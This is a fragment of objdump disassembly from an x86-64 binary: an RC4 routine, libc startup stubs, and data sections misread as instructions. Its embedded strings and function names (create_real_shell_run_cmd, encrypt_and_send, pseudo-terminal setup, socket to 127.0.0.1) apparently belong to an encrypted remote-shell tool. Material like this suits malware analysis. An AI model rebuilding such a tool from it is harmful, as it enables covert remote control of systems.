  4077f7:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
  4077fb:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  4077fe:	3b 45 cc             	cmp    -0x34(%rbp),%eax
  407801:	0f 8c 2f ff ff ff    	jl     407736 <rc4_crypt+0x3a>
  407807:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  40780b:	8b 55 e8             	mov    -0x18(%rbp),%edx
  40780e:	89 10                	mov    %edx,(%rax)
  407810:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  407814:	8b 55 ec             	mov    -0x14(%rbp),%edx
  407817:	89 50 04             	mov    %edx,0x4(%rax)
  40781a:	5d                   	pop    %rbp
  40781b:	c3                   	retq   
  40781c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000407820 <__libc_csu_init>:
  407820:	41 57                	push   %r15
  407822:	41 89 ff             	mov    %edi,%r15d
  407825:	41 56                	push   %r14
  407827:	49 89 f6             	mov    %rsi,%r14
  40782a:	41 55                	push   %r13
  40782c:	49 89 d5             	mov    %rdx,%r13
  40782f:	41 54                	push   %r12
  407831:	4c 8d 25 c8 15 20 00 	lea    0x2015c8(%rip),%r12        # 608e00 <__frame_dummy_init_array_entry>
  407838:	55                   	push   %rbp
  407839:	48 8d 2d c8 15 20 00 	lea    0x2015c8(%rip),%rbp        # 608e08 <__init_array_end>
  407840:	53                   	push   %rbx
  407841:	4c 29 e5             	sub    %r12,%rbp
  407844:	31 db                	xor    %ebx,%ebx
  407846:	48 c1 fd 03          	sar    $0x3,%rbp
  40784a:	48 83 ec 08          	sub    $0x8,%rsp
  40784e:	e8 45 95 ff ff       	callq  400d98 <_init>
  407853:	48 85 ed             	test   %rbp,%rbp
  407856:	74 1e                	je     407876 <__libc_csu_init+0x56>
  407858:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40785f:	00 
  407860:	4c 89 ea             	mov    %r13,%rdx
  407863:	4c 89 f6             	mov    %r14,%rsi
  407866:	44 89 ff             	mov    %r15d,%edi
  407869:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  40786d:	48 83 c3 01          	add    $0x1,%rbx
  407871:	48 39 eb             	cmp    %rbp,%rbx
  407874:	75 ea                	jne    407860 <__libc_csu_init+0x40>
  407876:	48 83 c4 08          	add    $0x8,%rsp
  40787a:	5b                   	pop    %rbx
  40787b:	5d                   	pop    %rbp
  40787c:	41 5c                	pop    %r12
  40787e:	41 5d                	pop    %r13
  407880:	41 5e                	pop    %r14
  407882:	41 5f                	pop    %r15
  407884:	c3                   	retq   
  407885:	66 66 2e 0f 1f 84 00 	data32 nopw %cs:0x0(%rax,%rax,1)
  40788c:	00 00 00 00 

0000000000407890 <__libc_csu_fini>:
  407890:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000407894 <_fini>:
  407894:	48 83 ec 08          	sub    $0x8,%rsp
  407898:	48 83 c4 08          	add    $0x8,%rsp
  40789c:	c3                   	retq   

Disassembly of section .rodata:

00000000004078a0 <_IO_stdin_used>:
  4078a0:	01 00                	add    %eax,(%rax)
  4078a2:	02 00                	add    (%rax),%al
	...
  4078b0:	ba 36 f7 2a 50       	mov    $0x502af736,%edx
  4078b5:	8e 5b d3             	mov    -0x2d(%rbx),%ds
  4078b8:	95                   	xchg   %eax,%ebp
  4078b9:	f9                   	stc    
  4078ba:	34 d3                	xor    $0xd3,%al
  4078bc:	52                   	push   %rdx
  4078bd:	26                   	es
  4078be:	46 74 00             	rex.RX je 4078c1 <_IO_stdin_used+0x21>
  4078c1:	45 52                	rex.RB push %r10
  4078c3:	52                   	push   %rdx
  4078c4:	00 25 31 30 73 5b    	add    %ah,0x5b733031(%rip)        # 5bb3a8fb <_end+0x5b53170b>
  4078ca:	25 73 5d 3a 00       	and    $0x3a5d73,%eax
  4078cf:	20 25 73 3a 20 00    	and    %ah,0x203a73(%rip)        # 60b348 <_end+0x2158>
  4078d5:	00 00                	add    %al,(%rax)
  4078d7:	00 46 61             	add    %al,0x61(%rsi)
  4078da:	69 6c 65 64 20 74 6f 	imul   $0x206f7420,0x64(%rbp,%riz,2),%ebp
  4078e1:	20 
  4078e2:	67                   	addr32
  4078e3:	65                   	gs
  4078e4:	74 20                	je     407906 <_IO_stdin_used+0x66>
  4078e6:	74 65                	je     40794d <_IO_stdin_used+0xad>
  4078e8:	72 6d                	jb     407957 <_IO_stdin_used+0xb7>
  4078ea:	69 6e 61 6c 20 61 74 	imul   $0x7461206c,0x61(%rsi),%ebp
  4078f1:	74 72                	je     407965 <_IO_stdin_used+0xc5>
  4078f3:	69 62 75 74 65 73 3a 	imul   $0x3a736574,0x75(%rdx),%esp
  4078fa:	20 25 64 0a 00 46    	and    %ah,0x46000a64(%rip)        # 46408364 <_end+0x45dff174>
  407900:	61                   	(bad)  
  407901:	69 6c 65 64 20 74 6f 	imul   $0x206f7420,0x64(%rbp,%riz,2),%ebp
  407908:	20 
  407909:	6f                   	outsl  %ds:(%rsi),(%dx)
  40790a:	70 65                	jo     407971 <_IO_stdin_used+0xd1>
  40790c:	6e                   	outsb  %ds:(%rsi),(%dx)
  40790d:	20 73 6f             	and    %dh,0x6f(%rbx)
  407910:	63 6b 65             	movslq 0x65(%rbx),%ebp
  407913:	74 3a                	je     40794f <_IO_stdin_used+0xaf>
  407915:	20 25 64 0a 00 31    	and    %ah,0x31000a64(%rip)        # 3140837f <_end+0x30dff18f>
  40791b:	32 37                	xor    (%rdi),%dh
  40791d:	2e 30 2e             	xor    %ch,%cs:(%rsi)
  407920:	30 2e                	xor    %ch,(%rsi)
  407922:	31 00                	xor    %eax,(%rax)
  407924:	2f                   	(bad)  
  407925:	62                   	(bad)  
  407926:	69 6e 2f 73 68 65 6c 	imul   $0x6c656873,0x2f(%rsi),%ebp
  40792d:	6c                   	insb   (%dx),%es:(%rdi)
  40792e:	73 00                	jae    407930 <_IO_stdin_used+0x90>
  407930:	4e 6f                	rex.WRX outsl %ds:(%rsi),(%dx)
  407932:	74 20                	je     407954 <_IO_stdin_used+0xb4>
  407934:	65 6e                	outsb  %gs:(%rsi),(%dx)
  407936:	6f                   	outsl  %ds:(%rsi),(%dx)
  407937:	75 67                	jne    4079a0 <_IO_stdin_used+0x100>
  407939:	68 20 62 75 66       	pushq  $0x66756220
  40793e:	66                   	data16
  40793f:	65                   	gs
  407940:	72 20                	jb     407962 <_IO_stdin_used+0xc2>
  407942:	6c                   	insb   (%dx),%es:(%rdi)
  407943:	65 6e                	outsb  %gs:(%rsi),(%dx)
  407945:	67 74 68             	addr32 je 4079b0 <_IO_stdin_used+0x110>
  407948:	20 66 6f             	and    %ah,0x6f(%rsi)
  40794b:	72 20                	jb     40796d <_IO_stdin_used+0xcd>
  40794d:	72 65                	jb     4079b4 <_IO_stdin_used+0x114>
  40794f:	61                   	(bad)  
  407950:	6c                   	insb   (%dx),%es:(%rdi)
  407951:	20 73 68             	and    %dh,0x68(%rbx)
  407954:	65                   	gs
  407955:	6c                   	insb   (%dx),%es:(%rdi)
  407956:	6c                   	insb   (%dx),%es:(%rdi)
  407957:	20 63 6f             	and    %ah,0x6f(%rbx)
  40795a:	6d                   	insl   (%dx),%es:(%rdi)
  40795b:	6d                   	insl   (%dx),%es:(%rdi)
  40795c:	61                   	(bad)  
  40795d:	6e                   	outsb  %ds:(%rsi),(%dx)
  40795e:	64 20 5b 6e          	and    %bl,%fs:0x6e(%rbx)
  407962:	65 65 64 3a 20       	gs gs cmp %fs:%gs:(%rax),%ah
  407967:	25 64 2c 20 61       	and    $0x61202c64,%eax
  40796c:	76 61                	jbe    4079cf <_IO_stdin_used+0x12f>
  40796e:	69 6c 61 62 6c 65 3a 	imul   $0x203a656c,0x62(%rcx,%riz,2),%ebp
  407975:	20 
  407976:	25 64 5d 0a 00       	and    $0xa5d64,%eax
  40797b:	53                   	push   %rbx
  40797c:	65 6e                	outsb  %gs:(%rsi),(%dx)
  40797e:	64 65 64 20 6d 65    	fs gs and %ch,%fs:%gs:0x65(%rbp)
  407984:	73 73                	jae    4079f9 <_IO_stdin_used+0x159>
  407986:	61                   	(bad)  
  407987:	67 65 3a 20          	cmp    %gs:(%eax),%ah
  40798b:	00 20                	add    %ah,(%rax)
  40798d:	20 73 65             	and    %dh,0x65(%rbx)
  407990:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
  407993:	64                   	fs
  407994:	73 3a                	jae    4079d0 <_IO_stdin_used+0x130>
  407996:	20 25 64 0a 00 75    	and    %ah,0x75000a64(%rip)        # 75408400 <_end+0x74dff210>
  40799c:	5f                   	pop    %rdi
  40799d:	73 65                	jae    407a04 <_IO_stdin_used+0x164>
  40799f:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
  4079a2:	64                   	fs
  4079a3:	73 3a                	jae    4079df <_IO_stdin_used+0x13f>
  4079a5:	20 25 64 0a 00 20    	and    %ah,0x20000a64(%rip)        # 2040840f <_end+0x1fdff21f>
  4079ab:	20 20                	and    %ah,(%rax)
  4079ad:	20 20                	and    %ah,(%rax)
  4079af:	20 75 69             	and    %dh,0x69(%rbp)
  4079b2:	64 3a 20             	cmp    %fs:(%rax),%ah
  4079b5:	25 64 0a 00 20       	and    $0x20000a64,%eax
  4079ba:	20 20                	and    %ah,(%rax)
  4079bc:	20 20                	and    %ah,(%rax)
  4079be:	20 70 69             	and    %dh,0x69(%rax)
  4079c1:	64 3a 20             	cmp    %fs:(%rax),%ah
  4079c4:	25 64 0a 00 20       	and    $0x20000a64,%eax
  4079c9:	20 20                	and    %ah,(%rax)
  4079cb:	20 20                	and    %ah,(%rax)
  4079cd:	20 64 69 72          	and    %ah,0x72(%rcx,%rbp,2)
  4079d1:	3a 20                	cmp    (%rax),%ah
  4079d3:	25 64 0a 00 20       	and    $0x20000a64,%eax
  4079d8:	20 20                	and    %ah,(%rax)
  4079da:	20 20                	and    %ah,(%rax)
  4079dc:	20 6c 65 6e          	and    %ch,0x6e(%rbp,%riz,2)
  4079e0:	3a 20                	cmp    (%rax),%ah
  4079e2:	25 64 0a 00 20       	and    $0x20000a64,%eax
  4079e7:	20 20                	and    %ah,(%rax)
  4079e9:	20 20                	and    %ah,(%rax)
  4079eb:	64                   	fs
  4079ec:	61                   	(bad)  
  4079ed:	74 61                	je     407a50 <_IO_stdin_used+0x1b0>
  4079ef:	3a 20                	cmp    (%rax),%ah
  4079f1:	00 20                	add    %ah,(%rax)
  4079f3:	65 6e                	outsb  %gs:(%rsi),(%dx)
  4079f5:	63 5f 64             	movslq 0x64(%rdi),%ebx
  4079f8:	61                   	(bad)  
  4079f9:	74 61                	je     407a5c <_IO_stdin_used+0x1bc>
  4079fb:	3a 20                	cmp    (%rax),%ah
  4079fd:	00 00                	add    %al,(%rax)
  4079ff:	00 53 48             	add    %dl,0x48(%rbx)
  407a02:	41 2d 31 20 63 68    	rex.B sub $0x68632031,%eax
  407a08:	65 63 6b 73          	movslq %gs:0x73(%rbx),%ebp
  407a0c:	75 6d                	jne    407a7b <_IO_stdin_used+0x1db>
  407a0e:	20 76 65             	and    %dh,0x65(%rsi)
  407a11:	72 69                	jb     407a7c <_IO_stdin_used+0x1dc>
  407a13:	66 69 63 61 74 69    	imul   $0x6974,0x61(%rbx),%sp
  407a19:	6f                   	outsl  %ds:(%rsi),(%dx)
  407a1a:	6e                   	outsb  %ds:(%rsi),(%dx)
  407a1b:	20 66 61             	and    %ah,0x61(%rsi)
  407a1e:	69 6c 65 64 00 45 65 	imul   $0x63654500,0x64(%rbp,%riz,2),%ebp
  407a25:	63 
  407a26:	65 69 76 65 64 20 6d 	imul   $0x656d2064,%gs:0x65(%rsi),%esi
  407a2d:	65 
  407a2e:	73 73                	jae    407aa3 <_IO_stdin_used+0x203>
  407a30:	61                   	(bad)  
  407a31:	67 65 3a 20          	cmp    %gs:(%eax),%ah
  407a35:	00 00                	add    %al,(%rax)
  407a37:	00 43 72             	add    %al,0x72(%rbx)
  407a3a:	65                   	gs
  407a3b:	61                   	(bad)  
  407a3c:	74 65                	je     407aa3 <_IO_stdin_used+0x203>
  407a3e:	20 72 65             	and    %dh,0x65(%rdx)
  407a41:	61                   	(bad)  
  407a42:	6c                   	insb   (%dx),%es:(%rdi)
  407a43:	20 73 68             	and    %dh,0x68(%rbx)
  407a46:	65                   	gs
  407a47:	6c                   	insb   (%dx),%es:(%rdi)
  407a48:	6c                   	insb   (%dx),%es:(%rdi)
  407a49:	20 63 6f             	and    %ah,0x6f(%rbx)
  407a4c:	6d                   	insl   (%dx),%es:(%rdi)
  407a4d:	6d                   	insl   (%dx),%es:(%rdi)
  407a4e:	61                   	(bad)  
  407a4f:	6e                   	outsb  %ds:(%rsi),(%dx)
  407a50:	64 20 66 61          	and    %ah,%fs:0x61(%rsi)
  407a54:	69 6c 65 64 00 44 42 	imul   $0x47424400,0x64(%rbp,%riz,2),%ebp
  407a5b:	47 
  407a5c:	00 53 74             	add    %dl,0x74(%rbx)
  407a5f:	61                   	(bad)  
  407a60:	72 74                	jb     407ad6 <_IO_stdin_used+0x236>
  407a62:	20 61 73             	and    %ah,0x73(%rcx)
  407a65:	3a 20                	cmp    (%rax),%ah
  407a67:	25 73 0a 00 00       	and    $0xa73,%eax
  407a6c:	00 00                	add    %al,(%rax)
  407a6e:	00 00                	add    %al,(%rax)
  407a70:	53                   	push   %rbx
  407a71:	6b 69 70 70          	imul   $0x70,0x70(%rcx),%ebp
  407a75:	69 6e 67 20 6e 6f 6e 	imul   $0x6e6f6e20,0x67(%rsi),%ebp
  407a7c:	20 69 6e             	and    %ch,0x6e(%rcx)
  407a7f:	74 65                	je     407ae6 <_IO_stdin_used+0x246>
  407a81:	72 61                	jb     407ae4 <_IO_stdin_used+0x244>
  407a83:	63 74 69 76          	movslq 0x76(%rcx,%rbp,2),%esi
  407a87:	65 20 73 68          	and    %dh,%gs:0x68(%rbx)
  407a8b:	65                   	gs
  407a8c:	6c                   	insb   (%dx),%es:(%rdi)
  407a8d:	6c                   	insb   (%dx),%es:(%rdi)
  407a8e:	20 73 65             	and    %dh,0x65(%rbx)
  407a91:	73 73                	jae    407b06 <_IO_stdin_used+0x266>
  407a93:	69 6f 6e 00 00 43 72 	imul   $0x72430000,0x6e(%rdi),%ebp
  407a9a:	65                   	gs
  407a9b:	61                   	(bad)  
  407a9c:	74 65                	je     407b03 <_IO_stdin_used+0x263>
  407a9e:	20 73 65             	and    %dh,0x65(%rbx)
  407aa1:	72 76                	jb     407b19 <_IO_stdin_used+0x279>
  407aa3:	65                   	gs
  407aa4:	72 20                	jb     407ac6 <_IO_stdin_used+0x226>
  407aa6:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
  407aa9:	6e                   	outsb  %ds:(%rsi),(%dx)
  407aaa:	65 63 74 69 6f       	movslq %gs:0x6f(%rcx,%rbp,2),%esi
  407aaf:	6e                   	outsb  %ds:(%rsi),(%dx)
  407ab0:	20 66 61             	and    %ah,0x61(%rsi)
  407ab3:	69 6c 65 64 00 4f 70 	imul   $0x65704f00,0x64(%rbp,%riz,2),%ebp
  407aba:	65 
  407abb:	6e                   	outsb  %ds:(%rsi),(%dx)
  407abc:	20 70 73             	and    %dh,0x73(%rax)
  407abf:	65                   	gs
  407ac0:	75 64                	jne    407b26 <_IO_stdin_used+0x286>
  407ac2:	6f                   	outsl  %ds:(%rsi),(%dx)
  407ac3:	20 74 65 72          	and    %dh,0x72(%rbp,%riz,2)
  407ac7:	6d                   	insl   (%dx),%es:(%rdi)
  407ac8:	69 6e 61 6c 20 66 61 	imul   $0x6166206c,0x61(%rsi),%ebp
  407acf:	69 6c 65 64 3a 20 25 	imul   $0x6425203a,0x64(%rbp,%riz,2),%ebp
  407ad6:	64 
  407ad7:	0a 00                	or     (%rax),%al
  407ad9:	47                   	rex.RXB
  407ada:	65                   	gs
  407adb:	74 20                	je     407afd <_IO_stdin_used+0x25d>
  407add:	54                   	push   %rsp
  407ade:	54                   	push   %rsp
  407adf:	59                   	pop    %rcx
  407ae0:	20 6e 61             	and    %ch,0x61(%rsi)
  407ae3:	6d                   	insl   (%dx),%es:(%rdi)
  407ae4:	65 20 66 61          	and    %ah,%gs:0x61(%rsi)
  407ae8:	69 6c 65 64 3a 20 25 	imul   $0x6425203a,0x64(%rbp,%riz,2),%ebp
  407aef:	64 
  407af0:	0a 00                	or     (%rax),%al
  407af2:	53                   	push   %rbx
  407af3:	6c                   	insb   (%dx),%es:(%rdi)
  407af4:	61                   	(bad)  
  407af5:	76 65                	jbe    407b5c <__FUNCTION__.4843+0xc>
  407af7:	20 64 65 76          	and    %ah,0x76(%rbp,%riz,2)
  407afb:	69 63 65 20 25 73 0a 	imul   $0xa732520,0x65(%rbx),%esp
  407b02:	00 53 65             	add    %dl,0x65(%rbx)
  407b05:	74 75                	je     407b7c <__FUNCTION__.4851+0x1c>
  407b07:	70 20                	jo     407b29 <_IO_stdin_used+0x289>
  407b09:	74 65                	je     407b70 <__FUNCTION__.4851+0x10>
  407b0b:	72 6d                	jb     407b7a <__FUNCTION__.4851+0x1a>
  407b0d:	69 6e 61 6c 20 66 61 	imul   $0x6166206c,0x61(%rsi),%ebp
  407b14:	69 6c 65 64 00 46 6f 	imul   $0x726f4600,0x64(%rbp,%riz,2),%ebp
  407b1b:	72 
  407b1c:	6b 20 70             	imul   $0x70,(%rax),%esp
  407b1f:	72 6f                	jb     407b90 <__FUNCTION__.4864+0x10>
  407b21:	63 65 73             	movslq 0x73(%rbp),%esp
  407b24:	73 20                	jae    407b46 <_IO_stdin_used+0x2a6>
  407b26:	66                   	data16
  407b27:	61                   	(bad)  
  407b28:	69 6c 65 64 3a 20 0a 	imul   $0xa203a,0x64(%rbp,%riz,2),%ebp
  407b2f:	00 
  407b30:	53                   	push   %rbx
  407b31:	74 61                	je     407b94 <__FUNCTION__.4864+0x14>
  407b33:	72 74                	jb     407ba9 <__FUNCTION__.4886+0x9>
  407b35:	20 61 20             	and    %ah,0x20(%rcx)
  407b38:	6e                   	outsb  %ds:(%rsi),(%dx)
  407b39:	65                   	gs
  407b3a:	77 20                	ja     407b5c <__FUNCTION__.4843+0xc>
  407b3c:	73 65                	jae    407ba3 <__FUNCTION__.4886+0x3>
  407b3e:	73 73                	jae    407bb3 <__FUNCTION__.4904+0x2>
  407b40:	69 6f 6e 20 66 61 69 	imul   $0x69616620,0x6e(%rdi),%ebp
  407b47:	6c                   	insb   (%dx),%es:(%rdi)
  407b48:	65 64 3a 20          	gs cmp %fs:%gs:(%rax),%ah
  407b4c:	25 64 0a 00 73       	and    $0x73000a64,%eax

0000000000407b50 <__FUNCTION__.4843>:
  407b50:	73 65                	jae    407bb7 <__FUNCTION__.4904+0x6>
  407b52:	74 75                	je     407bc9 <__FUNCTION__.4904+0x18>
  407b54:	70 5f                	jo     407bb5 <__FUNCTION__.4904+0x4>
  407b56:	74 65                	je     407bbd <__FUNCTION__.4904+0xc>
  407b58:	72 6d                	jb     407bc7 <__FUNCTION__.4904+0x16>
  407b5a:	69 6e 61 6c 00 00 63 	imul   $0x6300006c,0x61(%rsi),%ebp

0000000000407b60 <__FUNCTION__.4851>:
  407b60:	63 72 65             	movslq 0x65(%rdx),%esi
  407b63:	61                   	(bad)  
  407b64:	74 65                	je     407bcb <__FUNCTION__.4904+0x1a>
  407b66:	5f                   	pop    %rdi
  407b67:	73 65                	jae    407bce <__FUNCTION__.4904+0x1d>
  407b69:	72 76                	jb     407be1 <__FUNCTION__.4904+0x30>
  407b6b:	65                   	gs
  407b6c:	72 5f                	jb     407bcd <__FUNCTION__.4904+0x1c>
  407b6e:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
  407b71:	6e                   	outsb  %ds:(%rsi),(%dx)
  407b72:	65 63 74 69 6f       	movslq %gs:0x6f(%rcx,%rbp,2),%esi
  407b77:	6e                   	outsb  %ds:(%rsi),(%dx)
	...

0000000000407b80 <__FUNCTION__.4864>:
  407b80:	63 72 65             	movslq 0x65(%rdx),%esi
  407b83:	61                   	(bad)  
  407b84:	74 65                	je     407beb <__FUNCTION__.4904+0x3a>
  407b86:	5f                   	pop    %rdi
  407b87:	72 65                	jb     407bee <__FUNCTION__.4904+0x3d>
  407b89:	61                   	(bad)  
  407b8a:	6c                   	insb   (%dx),%es:(%rdi)
  407b8b:	5f                   	pop    %rdi
  407b8c:	73 68                	jae    407bf6 <__FUNCTION__.4904+0x45>
  407b8e:	65                   	gs
  407b8f:	6c                   	insb   (%dx),%es:(%rdi)
  407b90:	6c                   	insb   (%dx),%es:(%rdi)
  407b91:	5f                   	pop    %rdi
  407b92:	72 75                	jb     407c09 <__FUNCTION__.4904+0x58>
  407b94:	6e                   	outsb  %ds:(%rsi),(%dx)
  407b95:	5f                   	pop    %rdi
  407b96:	63 6d 64             	movslq 0x64(%rbp),%ebp
  407b99:	00 00                	add    %al,(%rax)
  407b9b:	00 00                	add    %al,(%rax)
  407b9d:	00 00                	add    %al,(%rax)
	...

0000000000407ba0 <__FUNCTION__.4886>:
  407ba0:	65 6e                	outsb  %gs:(%rsi),(%dx)
  407ba2:	63 72 79             	movslq 0x79(%rdx),%esi
  407ba5:	70 74                	jo     407c1b <__FUNCTION__.4904+0x6a>
  407ba7:	5f                   	pop    %rdi
  407ba8:	61                   	(bad)  
  407ba9:	6e                   	outsb  %ds:(%rsi),(%dx)
  407baa:	64                   	fs
  407bab:	5f                   	pop    %rdi
  407bac:	73 65                	jae    407c13 <__FUNCTION__.4904+0x62>
  407bae:	6e                   	outsb  %ds:(%rsi),(%dx)
  407baf:	64 00 6d 61          	add    %ch,%fs:0x61(%rbp)

0000000000407bb1 <__FUNCTION__.4904>:
  407bb1:	6d                   	insl   (%dx),%es:(%rdi)
  407bb2:	61                   	(bad)  
  407bb3:	69 6e 00 5b 30 78 25 	imul   $0x2578305b,0x0(%rsi),%ebp
  407bba:	30 32                	xor    %dh,(%rdx)
  407bbc:	78 5d                	js     407c1b <__FUNCTION__.4904+0x6a>
  407bbe:	20 00                	and    %al,(%rax)
  407bc0:	25 30 32 64 3a       	and    $0x3a643230,%eax
  407bc5:	25 30 32 64 3a       	and    $0x3a643230,%eax
  407bca:	25 30 32 64 00       	and    $0x643230,%eax

Disassembly of section .eh_frame_hdr:

0000000000407bd0 <.eh_frame_hdr>:
  407bd0:	01 1b                	add    %ebx,(%rbx)
  407bd2:	03 3b                	add    (%rbx),%edi
  407bd4:	b4 00                	mov    $0x0,%ah
  407bd6:	00 00                	add    %al,(%rax)
  407bd8:	15 00 00 00 f0       	adc    $0xf0000000,%eax
  407bdd:	91                   	xchg   %eax,%ecx
  407bde:	ff                   	(bad)  
  407bdf:	ff 00                	incl   (%rax)
  407be1:	01 00                	add    %eax,(%rax)
  407be3:	00 a0 94 ff ff d0    	add    %ah,-0x2f00006c(%rax)
  407be9:	00 00                	add    %al,(%rax)
  407beb:	00 8d 95 ff ff 28    	add    %cl,0x28ffff95(%rbp)
  407bf1:	01 00                	add    %eax,(%rax)
  407bf3:	00 c9                	add    %cl,%cl
  407bf5:	95                   	xchg   %eax,%ebp
  407bf6:	ff                   	(bad)  
  407bf7:	ff 48 01             	decl   0x1(%rax)
  407bfa:	00 00                	add    %al,(%rax)
  407bfc:	00 97 ff ff 70 01    	add    %dl,0x170ffff(%rdi)
  407c02:	00 00                	add    %al,(%rax)
  407c04:	28 97 ff ff 90 01    	sub    %dl,0x190ffff(%rdi)
  407c0a:	00 00                	add    %al,(%rax)
  407c0c:	18 98 ff ff b0 01    	sbb    %bl,0x1b0ffff(%rax)
  407c12:	00 00                	add    %al,(%rax)
  407c14:	cc                   	int3   
  407c15:	99                   	cltd   
  407c16:	ff                   	(bad)  
  407c17:	ff                   	(bad)  
  407c18:	d8 01                	fadds  (%rcx)
  407c1a:	00 00                	add    %al,(%rax)
  407c1c:	5d                   	pop    %rbp
  407c1d:	a5                   	movsl  %ds:(%rsi),%es:(%rdi)
  407c1e:	ff                   	(bad)  
  407c1f:	ff 00                	incl   (%rax)
  407c21:	02 00                	add    (%rax),%al
  407c23:	00 ba af ff ff 20    	add    %bh,0x20ffffaf(%rdx)
  407c29:	02 00                	add    (%rax),%al
  407c2b:	00 b5 b0 ff ff 40    	add    %dh,0x40ffffb0(%rbp)
  407c31:	02 00                	add    (%rax),%al
  407c33:	00 10                	add    %dl,(%rax)
  407c35:	b1 ff                	mov    $0xff,%cl
  407c37:	ff 60 02             	jmpq   *0x2(%rax)
  407c3a:	00 00                	add    %al,(%rax)
  407c3c:	bb b2 ff ff 80       	mov    $0x80ffffb2,%ebx
  407c41:	02 00                	add    (%rax),%al
  407c43:	00 48 b4             	add    %cl,-0x4c(%rax)
  407c46:	ff                   	(bad)  
  407c47:	ff a0 02 00 00 a8    	jmpq   *-0x57fffffe(%rax)
  407c4d:	b4 ff                	mov    $0xff,%ah
  407c4f:	ff c0                	inc    %eax
  407c51:	02 00                	add    (%rax),%al
  407c53:	00 1e                	add    %bl,(%rsi)
  407c55:	f6 ff                	idiv   %bh
  407c57:	ff e0                	jmpq   *%rax
  407c59:	02 00                	add    (%rax),%al
  407c5b:	00 5c f7 ff          	add    %bl,-0x1(%rdi,%rsi,8)
  407c5f:	ff 00                	incl   (%rax)
  407c61:	03 00                	add    (%rax),%eax
  407c63:	00 0d fa ff ff 20    	add    %cl,0x20fffffa(%rip)        # 21407c63 <_end+0x20dfea73>
  407c69:	03 00                	add    (%rax),%eax
  407c6b:	00 2c fb             	add    %ch,(%rbx,%rdi,8)
  407c6e:	ff                   	(bad)  
  407c6f:	ff 40 03             	incl   0x3(%rax)
  407c72:	00 00                	add    %al,(%rax)
  407c74:	50                   	push   %rax
  407c75:	fc                   	cld    
  407c76:	ff                   	(bad)  
  407c77:	ff 60 03             	jmpq   *0x3(%rax)
  407c7a:	00 00                	add    %al,(%rax)
  407c7c:	c0 fc ff             	sar    $0xff,%ah
  407c7f:	ff                   	.byte 0xff
  407c80:	a8 03                	test   $0x3,%al
	...

Disassembly of section .eh_frame:

0000000000407c88 <__FRAME_END__-0x308>:
  407c88:	14 00                	adc    $0x0,%al
  407c8a:	00 00                	add    %al,(%rax)
  407c8c:	00 00                	add    %al,(%rax)
  407c8e:	00 00                	add    %al,(%rax)
  407c90:	01 7a 52             	add    %edi,0x52(%rdx)
  407c93:	00 01                	add    %al,(%rcx)
  407c95:	78 10                	js     407ca7 <__FUNCTION__.4904+0xf6>
  407c97:	01 1b                	add    %ebx,(%rbx)
  407c99:	0c 07                	or     $0x7,%al
  407c9b:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
  407ca1:	00 00                	add    %al,(%rax)
  407ca3:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407ca6:	00 00                	add    %al,(%rax)
  407ca8:	c8 93 ff ff          	enterq $0xff93,$0xff
  407cac:	2a 00                	sub    (%rax),%al
	...
  407cb6:	00 00                	add    %al,(%rax)
  407cb8:	14 00                	adc    $0x0,%al
  407cba:	00 00                	add    %al,(%rax)
  407cbc:	00 00                	add    %al,(%rax)
  407cbe:	00 00                	add    %al,(%rax)
  407cc0:	01 7a 52             	add    %edi,0x52(%rdx)
  407cc3:	00 01                	add    %al,(%rcx)
  407cc5:	78 10                	js     407cd7 <__FUNCTION__.4904+0x126>
  407cc7:	01 1b                	add    %ebx,(%rbx)
  407cc9:	0c 07                	or     $0x7,%al
  407ccb:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
  407cd1:	00 00                	add    %al,(%rax)
  407cd3:	00 1c 00             	add    %bl,(%rax,%rax,1)
  407cd6:	00 00                	add    %al,(%rax)
  407cd8:	e8 90 ff ff b0       	callq  ffffffffb1407c6d <_end+0xffffffffb0dfea7d>
  407cdd:	02 00                	add    (%rax),%al
  407cdf:	00 00                	add    %al,(%rax)
  407ce1:	0e                   	(bad)  
  407ce2:	10 46 0e             	adc    %al,0xe(%rsi)
  407ce5:	18 4a 0f             	sbb    %cl,0xf(%rdx)
  407ce8:	0b 77 08             	or     0x8(%rdi),%esi
  407ceb:	80 00 3f             	addb   $0x3f,(%rax)
  407cee:	1a 3b                	sbb    (%rbx),%bh
  407cf0:	2a 33                	sub    (%rbx),%dh
  407cf2:	24 22                	and    $0x22,%al
  407cf4:	00 00                	add    %al,(%rax)
  407cf6:	00 00                	add    %al,(%rax)
  407cf8:	1c 00                	sbb    $0x0,%al
  407cfa:	00 00                	add    %al,(%rax)
  407cfc:	44 00 00             	add    %r8b,(%rax)
  407cff:	00 5d 94             	add    %bl,-0x6c(%rbp)
  407d02:	ff                   	(bad)  
  407d03:	ff                   	(bad)  
  407d04:	3c 00                	cmp    $0x0,%al
  407d06:	00 00                	add    %al,(%rax)
  407d08:	00 41 0e             	add    %al,0xe(%rcx)
  407d0b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407d11:	77 0c                	ja     407d1f <__FUNCTION__.4904+0x16e>
  407d13:	07                   	(bad)  
  407d14:	08 00                	or     %al,(%rax)
  407d16:	00 00                	add    %al,(%rax)
  407d18:	24 00                	and    $0x0,%al
  407d1a:	00 00                	add    %al,(%rax)
  407d1c:	64 00 00             	add    %al,%fs:(%rax)
  407d1f:	00 79 94             	add    %bh,-0x6c(%rcx)
  407d22:	ff                   	(bad)  
  407d23:	ff 37                	pushq  (%rdi)
  407d25:	01 00                	add    %eax,(%rax)
  407d27:	00 00                	add    %al,(%rax)
  407d29:	41 0e                	rex.B (bad) 
  407d2b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  407d31:	45 83 03 03          	rex.RB addl $0x3,(%r11)
  407d35:	2d 01 0c 07 08       	sub    $0x8070c01,%eax
  407d3a:	00 00                	add    %al,(%rax)
  407d3c:	00 00                	add    %al,(%rax)
  407d3e:	00 00                	add    %al,(%rax)
